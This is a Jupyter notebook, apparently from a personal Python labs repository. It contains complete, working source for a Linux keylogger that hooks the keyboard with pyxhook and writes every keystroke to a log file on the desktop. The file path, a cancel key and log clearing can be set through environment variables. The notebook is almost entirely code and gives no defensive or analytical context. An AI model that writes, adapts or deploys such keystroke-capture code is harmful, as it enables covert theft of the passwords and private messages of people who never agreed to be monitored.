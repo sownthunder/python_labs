{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# PYTHON CODE for keylogger\n",
    "# to be used in linux"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import pyxhook"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# This tells the keylogger where the log file will go. \n",
    "# You can set the file path as an environment variable ('pylogger_file'), \n",
    "# or use the default ~/Desktop/file.log \n",
    "log_file = os.environ.get( \n",
    "    'pylogger_file', \n",
    "    os.path.expanduser('~/Desktop/file.log') \n",
    ") \n",
    "# Allow setting the cancel key from environment args, Default: ` \n",
    "cancel_key = ord( \n",
    "    os.environ.get( \n",
    "        'pylogger_cancel', \n",
    "        '`'\n",
    "    )[0] \n",
    ") \n",
    "  \n",
    "# Allow clearing the log file on start, if pylogger_clean is defined. \n",
    "if os.environ.get('pylogger_clean', None) is not None: \n",
    "    try: \n",
    "        os.remove(log_file) \n",
    "    except EnvironmentError: \n",
    "       # File does not exist, or no permissions. \n",
    "        pass\n",
    "  \n",
    "#creating key pressing event and saving it into log file \n",
    "def OnKeyPress(event): \n",
    "    with open(log_file, 'a') as f: \n",
    "        f.write('{}\\n'.format(event.Key)) \n",
    "  \n",
    "# create a hook manager object \n",
    "new_hook = pyxhook.HookManager() \n",
    "new_hook.KeyDown = OnKeyPress \n",
    "# set the hook \n",
    "new_hook.HookKeyboard() \n",
    "try: \n",
    "    new_hook.start()         # start the hook \n",
    "except KeyboardInterrupt: \n",
    "    # User cancelled from command line. \n",
    "    pass\n",
    "except Exception as ex: \n",
    "    # Write exceptions to the log file, for analysis later. \n",
    "    msg = 'Error while catching events:\\n  {}'.format(ex) \n",
    "    pyxhook.print_err(msg) \n",
    "    with open(log_file, 'a') as f: \n",
    "        f.write('\\n{}'.format(msg)) "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
